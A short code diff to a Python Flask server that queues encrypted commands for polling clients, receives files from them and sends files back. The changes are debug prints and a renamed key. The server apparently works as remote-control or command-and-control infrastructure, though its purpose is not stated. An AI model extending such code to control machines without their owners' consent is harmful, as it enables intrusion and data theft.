@@ -485,6 +485,7 @@ def receive_command():
     if client_id in command_to_execute:
         command = command_to_execute[client_id]
         del command_to_execute[client_id]
+        print("Only command: ",command)
         command_to_encrypt = {"command": command}
         return encrypt_data(get_aes_key_by_client_id(client_id),f"{command_to_encrypt}")
     return jsonify({"command": None})
@@ -542,7 +543,7 @@ def upload_from_files():
     client_in_database = ClientData.query.filter_by(client_id=client_id).first
     if 'files' not in request.files:
         return jsonify({"success": False, "message": "No file part."}), 400
-
+    print(request.files)
     files = request.files.getlist('files')
 
     if len(files) == 0:
@@ -558,10 +559,11 @@ def upload_from_files():
         file_path = os.path.join(upload_path, f"{client_id}-{file.filename}")
         file.save(file_path)
         command_to_execute[client_id] = json.dumps({
-            "command": "UploadFromFiles",
+            "upload_type": "UploadFromFiles",
             "client_id": client_id,
             "filename": file.filename
         })
+        print(command_to_execute)
 
         saved_files.append(file.filename)
 
@@ -635,7 +637,6 @@ def upload_file_to_client():
         if  server_file_path_from_client and not filename:
             if server_file_path_from_client == original_server_file_path_for_file_to_send_to_client:
                 if os.path.exists(server_file_path_from_client):
-                    print("fileeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee")
                     return send_file(server_file_path_from_client, as_attachment=True)
                 else:
                     return jsonify({"success": False, "message": "File path does not exist."}), 400
